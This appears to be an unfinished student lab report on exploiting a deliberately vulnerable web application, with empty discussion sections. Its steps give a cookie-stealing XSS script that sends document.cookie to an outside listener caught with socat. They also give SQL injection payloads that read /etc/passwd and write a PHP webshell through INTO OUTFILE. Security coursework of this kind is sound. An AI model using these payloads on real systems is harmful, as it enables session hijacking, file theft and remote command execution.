# Report

## XSS

### Step

1. Vulnerability: 

   login no response no information added in post

   ![image-20250428114327300](./report_img/image-20250428114327300.png)

   ![image-20250428114657125](./report_img/image-20250428114657125.png)

    try comment: no encode for comment

   ![image-20250428114758544](./report_img/image-20250428114758544.png)

   so we can attack this application on this page

2. Ipconfig find the server ip

   ![image-20250428114101990](report_img/image-20250428114101990.png)

3. Use script to get the the cookie from server (since admin regularly login every time) 

   key:document.cookie

   ```html
   <script>location.href=http:'//192.168.5.20:80/index.php?test='+document.cookie;</script>
   ```

4. Socat capture cookie leak

   `socat TCP-LISTEN:80,reuseaddr,fork -`

   ![image-20250428115149526](report_img/image-20250428115149526.png)

5. set the cookie

   Use browser's console to set cookie

   ![image-20250428115531875](report_img/image-20250428115531875.png)

6. login as an admin successfully 

   ![image-20250428115438367](/Users/carol/Library/Application Support/typora-user-images/image-20250428115438367.png)

### Discussion

a comprehensive discussion of possible countermeasures (at least 4 mitigations)

- server-side

- client-side

## SQL Injection

### Step

1. Check edit pages

   ![image-20250428163607100](report_img/image-20250428163607100.png)

   We can see the parameter is `id=1` , assume backend query would look like:

   ```sql
   SELECT * FROM posts WHERE id = 1
   ```

2. Find vulnerability

   Adding a single quote (`'`) tests whether the input is sanitized or directly embedded into the SQL query. When append  (`'`)  at the end of the parameter value for id, a mysql error is displayed. 

   ![image-20250428173901230](report_img/image-20250428173901230.png)

   We can see that the absolute path is `/var/www`.

3. Fine the number of columns

   We append `UNION SELECT 1-- -` with increasing numbers of columns until the error stops.

   ![image-20250428182416908](report_img/image-20250428182416908.png)

   Finally the page loads without errors at `UNION SELECT 1,2,3,4` so the query has **4 **columns .

4. Payload

   Add  `UNION SELECT 1,2,user(),4-- -` and then we know that we are root.

   ![image-20250428213858366](report_img/image-20250428213858366.png)

5. Confirm file access

   `UNION SELECT 1,2,load_file("/etc/passwd"),4-- -`

   ![image-20250428214214497](report_img/image-20250428214214497.png)

6. Injecting a Webshell

   Since we have `/var/www` as an absolute path,  the user with `FILE` privilege can write here a PHP script which executes system commands via URL parameters.

   First try to write into /classes but fail

   ```sql
   UNION SELECT 1,"<?php system($_GET['c']); ?>",3,4 INTO OUTFILE '/var/www/classes/shell.php'-- -
   ```

   ![image-20250428215455896](report_img/image-20250428215455896.png)

   ```sql
   UNION SELECT 1,"<?php system($_GET['c']); ?>",3,4 INTO OUTFILE '/var/www/css/shell.php'-- -
   ```

   Check css folder then

   ![image-20250428220146981](report_img/image-20250428220146981.png)

   ![image-20250428220249246](report_img/image-20250428220249246.png)

7. TODO: In order to keep the access of admin:

### Discussion

